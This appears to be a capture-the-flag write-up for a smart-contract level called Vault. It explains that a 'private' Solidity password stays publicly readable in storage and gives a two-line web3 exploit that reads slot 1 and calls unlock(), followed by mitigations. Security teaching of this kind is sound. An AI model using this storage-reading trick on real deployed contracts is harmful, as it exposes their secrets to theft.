# Level 08: Vault

**Target:** [Vault.sol](./Vault.sol)

## Vulnerability

The contract stores a `password` as a `private` state variable and uses it to guard `unlock()`. The developer assumed `private` hides the data.

```solidity
bool public locked;       // slot 0
bytes32 private password; // slot 1 — "private" but fully readable off-chain
```

## Root Cause

`private` only prevents other contracts from reading via a getter. All storage is publicly readable off-chain via `eth_getStorageAt` — the blockchain is a public ledger.

## Exploit

Read slot 1 directly and pass the value to `unlock()`:

```javascript
const password = await web3.eth.getStorageAt(contract.address, 1);
await contract.unlock(password);
```

Solved via browser console — no exploit contract needed.

## Real-World Reference

This is the same fundamental issue as Level 12 (Privacy) but simpler. In production, sensitive data should never be stored in contract storage. Common mitigations include commitment schemes (store only the hash, reveal later) or off-chain computation with on-chain verification (ZK proofs). The [Blockchain Graveyard](https://magoo.github.io/Blockchain-Graveyard/) catalogs multiple incidents where "hidden" on-chain data was trivially read.
